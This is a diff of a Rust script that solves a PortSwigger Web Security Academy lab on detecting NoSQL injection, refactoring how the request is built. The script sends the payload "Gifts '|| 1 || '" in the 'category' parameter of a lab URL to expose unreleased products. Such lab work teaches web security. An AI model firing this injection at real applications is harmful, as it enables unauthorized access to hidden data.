@@ -1,81 +1,47 @@
-/************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 29/9/2023
+/**********************************************************************
 *
 * Lab: Detecting NoSQL injection
 *
-* Steps: 1. Inject payload into "category" query parameter to retrieve
-*           unreleased products
-*        2. Observe unreleased products in the response
+* Hack Steps: 
+*      1. Inject payload into "category" query parameter to retrieve
+*         unreleased products
+*      2. Observe unreleased products in the response
 *
-*************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+***********************************************************************/
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use std::{
-    collections::HashMap,
     io::{self, Write},
     time::Duration,
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0aec0083049b138e80fa5d2700e8008e.web-security-academy.net";
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a6b00bb04eb041280d82bd200ce0096.web-security-academy.net";
-    
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    println!("⦗#⦘ Injection parameter: {}", "category".yellow(),);
+    print!("❯❯ Injecting payload to retrieve unreleased products.. ",);
+    io::stdout().flush().unwrap();
 
-    println!(
-        "{} {}",
-        "❯ Injection parameter:".blue(),
-        "category".yellow(),
-    );
-
-    // payload to retrieve unreleased products
     let payload = "Gifts '|| 1 || '";
+    fetch(&format!("/filter?category={payload}"));
 
-    print!(
-        "{}",
-        "❯ Injecting payload to retrieve unreleased products.. ".white(),
-    );
-    io::stdout().flush();
-
-    // fetch the page with the injected payload
-    client
-        .get(format!("{url}/filter?category={payload}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch the page with the injected payload".red()
-        ));
     println!("{}", "OK".green());
-
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn fetch(path: &str) -> Response {
+    let client = build_web_client();
+    client
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
